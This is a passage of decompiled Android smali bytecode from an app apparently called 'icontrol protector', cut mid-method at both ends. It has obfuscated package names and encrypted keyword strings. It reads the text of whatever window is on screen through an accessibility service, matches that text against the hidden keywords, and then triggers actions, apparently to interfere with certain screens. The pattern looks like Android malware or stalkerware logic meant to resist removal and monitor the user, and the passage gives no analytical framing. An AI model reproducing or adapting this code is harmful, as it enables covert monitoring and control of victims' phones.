    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0xc

    new-array v1, v0, [B

    fill-array-data v1, :array_5a

    new-array v0, v13, [B

    fill-array-data v0, :array_5b

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v15, [B

    fill-array-data v0, :array_5c

    new-array v1, v13, [B

    fill-array-data v1, :array_5d

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v15, [B

    fill-array-data v0, :array_5e

    new-array v1, v13, [B

    fill-array-data v1, :array_5f

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v13, [B

    fill-array-data v0, :array_60

    new-array v1, v13, [B

    fill-array-data v1, :array_61

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0xb

    new-array v1, v0, [B

    fill-array-data v1, :array_62

    new-array v0, v13, [B

    fill-array-data v0, :array_63

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v14, [B

    fill-array-data v0, :array_64

    new-array v1, v13, [B

    fill-array-data v1, :array_65

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v15, [B

    fill-array-data v0, :array_66

    new-array v1, v13, [B

    fill-array-data v1, :array_67

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0xd

    new-array v0, v0, [B

    fill-array-data v0, :array_68

    new-array v1, v13, [B

    fill-array-data v1, :array_69

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/4 v0, 0x7

    new-array v1, v0, [B

    fill-array-data v1, :array_6a

    new-array v0, v13, [B

    fill-array-data v0, :array_6b

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/4 v0, 0x7

    new-array v1, v0, [B

    fill-array-data v1, :array_6c

    new-array v0, v13, [B

    fill-array-data v0, :array_6d

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0xb

    new-array v1, v0, [B

    fill-array-data v1, :array_6e

    new-array v0, v13, [B

    fill-array-data v0, :array_6f

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0x9

    new-array v1, v0, [B

    fill-array-data v1, :array_70

    new-array v0, v13, [B

    fill-array-data v0, :array_71

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    new-array v0, v15, [B

    fill-array-data v0, :array_72

    new-array v1, v13, [B

    fill-array-data v1, :array_73

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0xc

    new-array v1, v0, [B

    fill-array-data v1, :array_74

    new-array v0, v13, [B

    fill-array-data v0, :array_75

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_12

    const/16 v0, 0x16

    new-array v0, v0, [B

    fill-array-data v0, :array_76

    new-array v1, v13, [B

    fill-array-data v1, :array_77

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_13

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_13

    :cond_12
    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    return-void

    :catch_4
    :cond_13
    :try_start_9
    invoke-static {}, Lcom/icontrol/protector/a;->T()Lcom/icontrol/protector/AccessServices;

    move-result-object v0

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/a;->Y(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_78

    new-array v1, v13, [B

    fill-array-data v1, :array_79

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_14

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    :cond_14
    new-array v1, v13, [B

    fill-array-data v1, :array_7a

    new-array v3, v13, [B

    fill-array-data v3, :array_7b

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_15

    new-array v1, v13, [B

    fill-array-data v1, :array_7c

    new-array v3, v13, [B

    fill-array-data v3, :array_7d

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_16

    :cond_15
    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_16

    new-array v1, v14, [B

    fill-array-data v1, :array_7e

    new-array v3, v13, [B

    fill-array-data v3, :array_7f

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v7, [B

    fill-array-data v1, :array_80

    new-array v3, v13, [B

    fill-array-data v3, :array_81

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/16 v1, 0xc

    new-array v3, v1, [B

    fill-array-data v3, :array_82

    new-array v1, v13, [B

    fill-array-data v1, :array_83

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_84

    new-array v3, v13, [B

    fill-array-data v3, :array_85

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v13, [B

    fill-array-data v1, :array_86

    new-array v3, v13, [B

    fill-array-data v3, :array_87

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v10, [B

    fill-array-data v1, :array_88

    new-array v3, v13, [B

    fill-array-data v3, :array_89

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v14, [B

    fill-array-data v1, :array_8a

    new-array v3, v13, [B

    fill-array-data v3, :array_8b

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_8c

    new-array v3, v13, [B

    fill-array-data v3, :array_8d

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v14, [B

    fill-array-data v1, :array_8e

    new-array v3, v13, [B

    fill-array-data v3, :array_8f

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    :cond_16
    new-array v1, v13, [B

    fill-array-data v1, :array_90

    new-array v3, v13, [B

    fill-array-data v3, :array_91

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_17

    new-array v1, v13, [B

    fill-array-data v1, :array_92

    new-array v3, v13, [B

    fill-array-data v3, :array_93

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_18

    :cond_17
    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_18

    new-array v1, v14, [B

    fill-array-data v1, :array_94

    new-array v3, v13, [B

    fill-array-data v3, :array_95

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/16 v1, 0x9

    new-array v1, v1, [B

    fill-array-data v1, :array_96

    new-array v3, v13, [B

    fill-array-data v3, :array_97

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/16 v1, 0xb

    new-array v3, v1, [B

    fill-array-data v3, :array_98

    new-array v1, v13, [B

    fill-array-data v1, :array_99

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x5

    new-array v3, v1, [B

    fill-array-data v3, :array_9a

    new-array v1, v13, [B

    fill-array-data v1, :array_9b

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v9, [B

    fill-array-data v1, :array_9c

    new-array v3, v13, [B

    fill-array-data v3, :array_9d

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v14, [B

    fill-array-data v1, :array_9e

    new-array v3, v13, [B

    fill-array-data v3, :array_9f

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_a0

    new-array v1, v13, [B

    fill-array-data v1, :array_a1

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x5

    new-array v3, v1, [B

    fill-array-data v3, :array_a2

    new-array v1, v13, [B

    fill-array-data v1, :array_a3

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    :cond_18
    new-array v1, v13, [B

    fill-array-data v1, :array_a4

    new-array v3, v13, [B

    fill-array-data v3, :array_a5

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_19

    new-array v1, v13, [B

    fill-array-data v1, :array_a6

    new-array v3, v13, [B

    fill-array-data v3, :array_a7

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1a

    :cond_19
    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1a

    const/16 v1, 0x18

    new-array v1, v1, [B

    fill-array-data v1, :array_a8

    new-array v3, v13, [B

    fill-array-data v3, :array_a9

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_aa

    new-array v3, v13, [B

    fill-array-data v3, :array_ab

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/16 v1, 0xc

    new-array v3, v1, [B

    fill-array-data v3, :array_ac

    new-array v1, v13, [B

    fill-array-data v1, :array_ad

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_ae

    new-array v3, v13, [B

    fill-array-data v3, :array_af

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_b0

    new-array v3, v13, [B

    fill-array-data v3, :array_b1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_b2

    new-array v3, v13, [B

    fill-array-data v3, :array_b3

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_b4

    new-array v3, v13, [B

    fill-array-data v3, :array_b5

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_b6

    new-array v3, v13, [B

    fill-array-data v3, :array_b7

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/16 v1, 0xc

    new-array v3, v1, [B

    fill-array-data v3, :array_b8

    new-array v1, v13, [B

    fill-array-data v1, :array_b9

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_ba

    new-array v3, v13, [B

    fill-array-data v3, :array_bb

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_bc

    new-array v3, v13, [B

    fill-array-data v3, :array_bd

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_be

    new-array v3, v13, [B

    fill-array-data v3, :array_bf

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    :cond_1a
    new-array v1, v13, [B

    fill-array-data v1, :array_c0

    new-array v3, v13, [B

    fill-array-data v3, :array_c1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1b

    new-array v1, v13, [B

    fill-array-data v1, :array_c2

    new-array v3, v13, [B

    fill-array-data v3, :array_c3

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1c

    :cond_1b
    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1c

    const/16 v1, 0x1e

    new-array v1, v1, [B

    fill-array-data v1, :array_c4

    new-array v3, v13, [B

    fill-array-data v3, :array_c5

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_c6

    new-array v1, v13, [B

    fill-array-data v1, :array_c7

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_c8

    new-array v1, v13, [B

    fill-array-data v1, :array_c9

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v15, [B

    fill-array-data v1, :array_ca

    new-array v3, v13, [B

    fill-array-data v3, :array_cb

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_cc

    new-array v1, v13, [B

    fill-array-data v1, :array_cd

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x3

    new-array v3, v1, [B

    fill-array-data v3, :array_ce

    new-array v1, v13, [B

    fill-array-data v1, :array_cf

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/16 v1, 0xc

    new-array v3, v1, [B

    fill-array-data v3, :array_d0

    new-array v1, v13, [B

    fill-array-data v1, :array_d1

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    new-array v1, v8, [B

    fill-array-data v1, :array_d2

    new-array v3, v13, [B

    fill-array-data v3, :array_d3

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x7

    new-array v3, v1, [B

    fill-array-data v3, :array_d4

    new-array v1, v13, [B

    fill-array-data v1, :array_d5

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x5

    new-array v3, v1, [B

    fill-array-data v3, :array_d6

    new-array v1, v13, [B

    fill-array-data v1, :array_d7

    invoke-static {v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/4 v1, 0x3

    new-array v1, v1, [B

    fill-array-data v1, :array_d8

    new-array v3, v13, [B

    fill-array-data v3, :array_d9

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    const/16 v1, 0x20

    new-array v1, v1, [B

    fill-array-data v1, :array_da

    new-array v3, v13, [B

    fill-array-data v3, :array_db

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_20

    :cond_1c
    new-array v1, v13, [B

    fill-array-data v1, :array_dc

    new-array v3, v13, [B

    fill-array-data v3, :array_dd

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    const/16 v3, 0x12

    if-nez v1, :cond_1d

    new-array v1, v13, [B

    fill-array-data v1, :array_de

    new-array v5, v13, [B

    fill-array-data v5, :array_df

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1e

    :cond_1d
    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

